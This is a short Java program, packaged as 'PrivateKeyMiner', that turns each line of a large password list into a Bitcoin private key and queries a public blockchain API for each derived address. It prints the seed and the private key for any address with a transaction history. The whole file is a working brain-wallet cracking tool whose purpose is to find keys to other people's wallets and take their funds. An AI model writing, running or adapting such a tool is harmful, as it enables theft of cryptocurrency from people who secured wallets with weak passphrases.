package PrivateKeyMiner;

import org.json.*;
import org.bitcoinj.core.*;
import okhttp3.*;

import java.security.*;
import java.io.*;

public class Main {

    public static void main(String[] args) {
        try {
            final NetworkParameters netParams = NetworkParameters.prodNet();

            BufferedReader in = new BufferedReader(new FileReader(System.getProperty("user.dir") + "/14M Passwords.txt"));

            while (true) {
                String seed = in.readLine();

                if (seed == null) {
                    break;
                }

                MessageDigest digest = MessageDigest.getInstance("SHA-256");
                byte[] hash = digest.digest(seed.getBytes());

                ECKey key = new ECKey(new SecureRandom(hash));

                JSONObject j = new JSONObject();
                JSONObject compressed = getInfo(key.toAddress(netParams) + "");
                JSONObject uncompressed = getInfo(key.decompress().toAddress(netParams) + "");

                j.put("seed", seed);
                j.put("private", key.getPrivateKeyEncoded(netParams));
                j.put("compressed", compressed);
                j.put("uncompressed", uncompressed);

                if (j.getJSONObject("compressed").getJSONObject("chain_stats").getInt("tx_count") > 0
                        || j.getJSONObject("uncompressed").getJSONObject("chain_stats").getInt("tx_count") > 0) {
                    System.out.println(j);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static JSONObject getInfo(String address) throws Exception {
        //https://api.blockcypher.com/v1/btc/main/addrs/1a9c9WnxesADVvkf8H59XHhKqNS22AjvU (3 requests/sec and 200 requests/hr)
        //https://blockstream.info/api/address/1a9c9WnxesADVvkf8H59XHhKqNS22AjvU
        OkHttpClient client = HTTPClient.getOkHttpClient();

        Request request = new Request.Builder()
                .url("https://blockstream.info/api/address/" + address)
                .addHeader("Content-Type", "application/json")
                .build();

        Response response = client.newCall(request).execute();

        BufferedReader r = new BufferedReader(new InputStreamReader(response.body().byteStream()));

        JSONObject j = new JSONObject(r.readLine());

        response.body().close();
        client.dispatcher().executorService().shutdown();
        client.connectionPool().evictAll();

        return j;
    }
}
